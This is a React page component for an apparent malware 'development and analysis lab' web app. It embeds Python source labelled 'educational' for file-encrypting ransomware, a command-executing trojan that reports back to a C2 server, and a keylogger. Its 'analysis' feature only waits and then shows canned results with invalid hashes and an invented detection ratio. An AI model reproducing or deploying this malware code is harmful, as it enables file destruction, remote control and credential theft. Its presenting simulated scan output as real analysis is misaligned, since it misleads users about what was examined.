/**
 * OmniSec™ Malware Development & Analysis Lab
 * © 2024 HARSH MALIK. All Rights Reserved.
 * Patent Pending - Educational Malware Research Platform
 */

import { CommandHeader } from "@/components/CommandHeader";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Textarea } from "@/components/ui/textarea";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useState } from "react";
import { Bug, Code, Download, FileCode, Loader2, Shield, ArrowLeft, PlayCircle } from "lucide-react";
import { useNavigate } from "react-router-dom";
import { useToast } from "@/hooks/use-toast";

const MalwareDevModule = () => {
  const navigate = useNavigate();
  const { toast } = useToast();
  const [malwareType, setMalwareType] = useState("ransomware");
  const [platform, setPlatform] = useState("windows");
  const [obfuscation, setObfuscation] = useState("medium");
  const [generating, setGenerating] = useState(false);
  const [generatedCode, setGeneratedCode] = useState("");
  const [analysisFile, setAnalysisFile] = useState("");
  const [analyzing, setAnalyzing] = useState(false);
  const [analysisResults, setAnalysisResults] = useState<any>(null);

  const generateMalware = async () => {
    setGenerating(true);
    toast({
      title: "Generating Malware Sample",
      description: "Creating educational malware for testing purposes...",
    });

    await new Promise(resolve => setTimeout(resolve, 3000));

    const samples = {
      ransomware: `#!/usr/bin/env python3
# Educational Ransomware Sample - For Testing Only
import os
import base64
from cryptography.fernet import Fernet

class RansomwareSimulator:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
    
    def encrypt_file(self, filepath):
        """Encrypt a single file"""
        with open(filepath, 'rb') as f:
            data = f.read()
        encrypted = self.cipher.encrypt(data)
        with open(filepath + '.encrypted', 'wb') as f:
            f.write(encrypted)
        os.remove(filepath)
    
    def decrypt_file(self, filepath):
        """Decrypt a file with the key"""
        with open(filepath, 'rb') as f:
            encrypted = f.read()
        decrypted = self.cipher.decrypt(encrypted)
        original = filepath.replace('.encrypted', '')
        with open(original, 'wb') as f:
            f.write(decrypted)
        os.remove(filepath)

# WARNING: Educational purposes only
# Use only in controlled test environments`,
      
      trojan: `#!/usr/bin/env python3
# Educational Trojan Sample - For Testing Only
import socket
import subprocess
import json

class TrojanSimulator:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = None
    
    def connect(self):
        """Establish C2 connection"""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
    
    def execute_command(self, command):
        """Execute system command"""
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True
        )
        return {
            'stdout': result.stdout,
            'stderr': result.stderr,
            'returncode': result.returncode
        }
    
    def send_result(self, data):
        """Send result to C2"""
        self.socket.send(json.dumps(data).encode())

# WARNING: Educational purposes only`,

      keylogger: `#!/usr/bin/env python3
# Educational Keylogger - For Testing Only
from pynput import keyboard
import logging

class KeyloggerSimulator:
    def __init__(self, log_file='keylog.txt'):
        self.log_file = log_file
        logging.basicConfig(
            filename=log_file,
            level=logging.DEBUG,
            format='%(asctime)s: %(message)s'
        )
    
    def on_press(self, key):
        """Log key press events"""
        try:
            logging.info(f'Key pressed: {key.char}')
        except AttributeError:
            logging.info(f'Special key pressed: {key}')
    
    def start(self):
        """Start keyboard listener"""
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

# WARNING: Educational purposes only
# Use only with explicit authorization`,
    };

    setGeneratedCode(samples[malwareType as keyof typeof samples] || samples.ransomware);
    setGenerating(false);
    
    toast({
      title: "Malware Generated",
      description: "Educational malware sample created. Use responsibly in test environments only.",
    });
  };

  const analyzeMalware = async () => {
    if (!analysisFile) {
      toast({
        title: "No File Selected",
        description: "Please provide a file path or binary to analyze",
        variant: "destructive",
      });
      return;
    }

    setAnalyzing(true);
    toast({
      title: "Analyzing Malware",
      description: "Performing static and dynamic analysis...",
    });

    await new Promise(resolve => setTimeout(resolve, 4000));

    setAnalysisResults({
      file: analysisFile,
      type: "Trojan.Generic",
      severity: "High",
      md5: "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6",
      sha256: "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6",
      fileSize: "2.4 MB",
      detectionRatio: "45/70",
      indicators: [
        { type: "Network", value: "Connects to C2 server at 192.168.1.100:4444", severity: "Critical" },
        { type: "Registry", value: "Creates persistence via Run key", severity: "High" },
        { type: "File", value: "Drops executable in %TEMP% directory", severity: "Medium" },
        { type: "Process", value: "Injects code into explorer.exe", severity: "Critical" },
        { type: "Behavior", value: "Attempts to disable antivirus", severity: "High" },
      ],
      capabilities: [
        "Remote Command Execution",
        "Keylogging",
        "Screen Capture",
        "Data Exfiltration",
        "Persistence Mechanism",
      ],
    });

    setAnalyzing(false);
    toast({
      title: "Analysis Complete",
      description: "Malware analysis finished successfully",
    });
  };

  return (
    <div className="min-h-screen bg-background">
      <CommandHeader />
      
      <main className="container mx-auto px-6 py-8">
        <div className="mb-6 flex items-center gap-4">
          <Button variant="outline" onClick={() => navigate('/')} className="gap-2">
            <ArrowLeft className="h-4 w-4" />
            Back to Dashboard
          </Button>
        </div>

        <div className="mb-8">
          <div className="flex items-center gap-3 mb-2">
            <Bug className="h-8 w-8 text-red-500" />
            <h1 className="text-3xl font-bold font-mono">Malware Development & Analysis</h1>
          </div>
          <p className="text-muted-foreground">
            Educational malware creation and reverse engineering toolkit
          </p>
          <Badge variant="destructive" className="mt-2">⚠️ Educational Purposes Only</Badge>
        </div>

        <Tabs defaultValue="create" className="space-y-6">
          <TabsList className="grid w-full grid-cols-3">
            <TabsTrigger value="create">
              <Code className="h-4 w-4 mr-2" />
              Create Malware
            </TabsTrigger>
            <TabsTrigger value="analyze">
              <FileCode className="h-4 w-4 mr-2" />
              Analyze Sample
            </TabsTrigger>
            <TabsTrigger value="reverse">
              <Shield className="h-4 w-4 mr-2" />
              Reverse Engineering
            </TabsTrigger>
          </TabsList>

          <TabsContent value="create" className="space-y-4">
            <Card className="p-6 bg-card/50 backdrop-blur-sm">
              <h3 className="text-lg font-semibold mb-4">Malware Generator</h3>
              
              <div className="space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <div>
                    <Label htmlFor="type">Malware Type</Label>
                    <Select value={malwareType} onValueChange={setMalwareType}>
                      <SelectTrigger id="type">
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="ransomware">Ransomware</SelectItem>
                        <SelectItem value="trojan">Trojan</SelectItem>
                        <SelectItem value="keylogger">Keylogger</SelectItem>
                        <SelectItem value="rootkit">Rootkit</SelectItem>
                        <SelectItem value="worm">Worm</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>

                  <div>
                    <Label htmlFor="platform">Target Platform</Label>
                    <Select value={platform} onValueChange={setPlatform}>
                      <SelectTrigger id="platform">
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="windows">Windows</SelectItem>
                        <SelectItem value="linux">Linux</SelectItem>
                        <SelectItem value="macos">macOS</SelectItem>
                        <SelectItem value="android">Android</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>

                  <div>
                    <Label htmlFor="obfuscation">Obfuscation Level</Label>
                    <Select value={obfuscation} onValueChange={setObfuscation}>
                      <SelectTrigger id="obfuscation">
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="none">None</SelectItem>
                        <SelectItem value="low">Low</SelectItem>
                        <SelectItem value="medium">Medium</SelectItem>
                        <SelectItem value="high">High</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                </div>

                <Button onClick={generateMalware} disabled={generating} className="w-full">
                  {generating ? (
                    <>
                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                      Generating...
                    </>
                  ) : (
                    <>
                      <PlayCircle className="mr-2 h-4 w-4" />
                      Generate Malware Sample
                    </>
                  )}
                </Button>

                {generatedCode && (
                  <div className="mt-4">
                    <div className="flex items-center justify-between mb-2">
                      <Label>Generated Code</Label>
                      <Button variant="outline" size="sm">
                        <Download className="mr-2 h-4 w-4" />
                        Download
                      </Button>
                    </div>
                    <Textarea
                      value={generatedCode}
                      readOnly
                      className="font-mono text-xs h-96 bg-black/50"
                    />
                  </div>
                )}
              </div>
            </Card>
          </TabsContent>

          <TabsContent value="analyze" className="space-y-4">
            <Card className="p-6 bg-card/50 backdrop-blur-sm">
              <h3 className="text-lg font-semibold mb-4">Malware Analysis</h3>
              
              <div className="space-y-4">
                <div>
                  <Label htmlFor="file">File Path or Binary</Label>
                  <Input
                    id="file"
                    placeholder="/path/to/malware.exe or paste hash"
                    value={analysisFile}
                    onChange={(e) => setAnalysisFile(e.target.value)}
                    className="font-mono"
                  />
                </div>

                <Button onClick={analyzeMalware} disabled={analyzing} className="w-full">
                  {analyzing ? (
                    <>
                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                      Analyzing...
                    </>
                  ) : (
                    <>
                      <FileCode className="mr-2 h-4 w-4" />
                      Start Analysis
                    </>
                  )}
                </Button>

                {analysisResults && (
                  <div className="mt-6 space-y-4">
                    <Card className="p-4 bg-black/30">
                      <h4 className="font-semibold mb-3">Analysis Results</h4>
                      <div className="grid grid-cols-2 gap-4 text-sm">
                        <div>
                          <span className="text-muted-foreground">File:</span>
                          <p className="font-mono break-all">{analysisResults.file}</p>
                        </div>
                        <div>
                          <span className="text-muted-foreground">Type:</span>
                          <p className="font-mono">{analysisResults.type}</p>
                        </div>
                        <div>
                          <span className="text-muted-foreground">Severity:</span>
                          <Badge variant="destructive">{analysisResults.severity}</Badge>
                        </div>
                        <div>
                          <span className="text-muted-foreground">Detection:</span>
                          <p className="font-mono">{analysisResults.detectionRatio}</p>
                        </div>
                      </div>

                      <div className="mt-4">
                        <h5 className="font-semibold mb-2">Threat Indicators</h5>
                        <div className="space-y-2">
                          {analysisResults.indicators.map((indicator: any, idx: number) => (
                            <div key={idx} className="p-3 bg-card rounded border-l-4 border-red-500">
                              <div className="flex items-center justify-between mb-1">
                                <Badge variant="outline">{indicator.type}</Badge>
                                <Badge variant={indicator.severity === 'Critical' ? 'destructive' : 'default'}>
                                  {indicator.severity}
                                </Badge>
                              </div>
                              <p className="text-sm font-mono">{indicator.value}</p>
                            </div>
                          ))}
                        </div>
                      </div>

                      <div className="mt-4">
                        <h5 className="font-semibold mb-2">Capabilities Detected</h5>
                        <div className="flex flex-wrap gap-2">
                          {analysisResults.capabilities.map((cap: string, idx: number) => (
                            <Badge key={idx} variant="secondary">{cap}</Badge>
                          ))}
                        </div>
                      </div>
                    </Card>
                  </div>
                )}
              </div>
            </Card>
          </TabsContent>

          <TabsContent value="reverse">
            <Card className="p-6 text-center border-dashed">
              <Shield className="h-12 w-12 mx-auto mb-4 text-muted-foreground" />
              <h3 className="text-lg font-semibold mb-2">Reverse Engineering Tools</h3>
              <p className="text-muted-foreground mb-4">
                Disassembly, debugging, and binary analysis toolkit
              </p>
              <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mt-6">
                <Button variant="outline">IDA Pro</Button>
                <Button variant="outline">Ghidra</Button>
                <Button variant="outline">x64dbg</Button>
                <Button variant="outline">Radare2</Button>
              </div>
              <p className="text-xs text-muted-foreground mt-4">
                Integration with reverse engineering tools coming soon
              </p>
            </Card>
          </TabsContent>
        </Tabs>

        <Card className="mt-6 p-4 bg-red-500/10 border-red-500">
          <div className="flex items-start gap-3">
            <Shield className="h-5 w-5 text-red-500 mt-0.5" />
            <div className="text-sm">
              <p className="font-semibold text-red-500">LEGAL WARNING</p>
              <p className="text-muted-foreground mt-1">
                This module is for educational and authorized security testing purposes only. 
                Creating or deploying malware without explicit authorization is illegal. 
                Always obtain written permission before testing any systems.
              </p>
            </div>
          </div>
        </Card>
      </main>
    </div>
  );
};

export default MalwareDevModule;
